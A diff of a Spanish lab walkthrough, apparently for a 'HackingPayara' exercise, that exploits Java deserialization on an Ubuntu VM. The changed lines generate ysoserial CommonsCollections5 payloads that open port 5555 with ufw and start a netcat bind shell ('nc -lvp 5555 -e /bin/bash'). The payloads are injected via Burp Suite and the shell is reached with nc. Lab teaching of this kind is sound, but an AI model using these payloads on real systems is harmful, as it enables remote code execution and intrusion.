@@ -113,14 +113,21 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
     * Selecciona el archivo `.war` que se encuentra en la carpeta `config_ubuntu` del repositorio `HackingPayara` que clonaste ej. `HackingPayara/config_ubuntu/tu-aplicacion.war`.
     * Sigue los pasos para desplegar la aplicación.
 
+### 1.4 Configuración del Firewall 
+
+
+
 ---
 ## 2. Pasos de Preparación del Entorno (en Kali)
 
 ### 2.1. Configuración del Payload y ysoserial
 
-Para generar el payload necesario, sigue estos pasos:
+Para generar los payload necesario, sigue estos pasos:
 
-1.  **Define la variable de entorno para el payload:**
+1.  **Define las variable de entorno para el payload:**
+    ```bash
+    BIND_FIREWALL_COMMAND="/usr/sbin/ufw allow 5555/tcp"
+    ```
     ```bash
     BIND_SHELL_COMMAND="nc -lvp 5555 -e /bin/bash"
     ```
@@ -149,13 +156,16 @@ Para generar el payload necesario, sigue estos pasos:
     sudo update-alternatives --config java
     ```
     *Selecciona la opción que corresponda a Java 1.8 de Corretto.*
-8.  **Crea el payload con `ysoserial`:**
+8.  **Crea los payload con `ysoserial`:**
     Asegúrate de estar en el directorio `~/Desktop`. La salida de este comando será tu payload codificado en Base64; **guárdalo, lo necesitarás más adelante.**
+    ```bash
+    java -jar ysoserial.jar CommonsCollections5 "$BIND_FIREWALL_COMMAND" | base64 -w 0
+    ```
     ```bash
     java -jar ysoserial.jar CommonsCollections5 "$BIND_SHELL_COMMAND" | base64 -w 0
     ```
 9.  **Restaura la versión original de Java:**
-    Una vez que hayas generado el payload, es recomendable volver a la versión de Java que tenías antes (por ejemplo, Java 21, común en las últimas distribuciones de GNU/Linux).
+    Una vez que hayas generado los payload, es recomendable volver a la versión de Java que tenías antes (por ejemplo, Java 21, común en las últimas distribuciones de GNU/Linux).
     ```bash
     sudo update-alternatives --config java
     ```
@@ -662,9 +672,9 @@ Usa Burp Suite para interceptar tráfico y, potencialmente, inyectar el payload 
 5.  **Captura el tráfico de inicio de sesión y envía el payload:**
     * Navega a la aplicación web vulnerable en Firefox.
     * Intenta iniciar sesión. En Burp Suite, en la pestaña **Proxy** > **Intercept**, haz clic en **Forward** o desactiva la intercepción temporalmente hasta que se generen las cookies de sesión después del inicio de sesión exitoso.
-    * Una vez dentro de la aplicación vulnerable, inyecta tu payload el generado con `ysoserial` y codificado en Base64.
+    * Una vez dentro de la aplicación vulnerable, inyecta los payload generados con `ysoserial` y codificado en Base64.
 6.  **Inicia el listener de Netcat:**
-    Después de inyectar el payload en la aplicación vulnerable y obtener la `bind shell` en la máquina Ubuntu víctima, ejecuta este comando en Kali para conectarte:
+    Después de inyectar los payload en la aplicación vulnerable y obtener la `bind shell` en la máquina Ubuntu víctima, ejecuta este comando en Kali para conectarte:
     ```bash
     nc <IP_UBUNTU> 5555
     ```
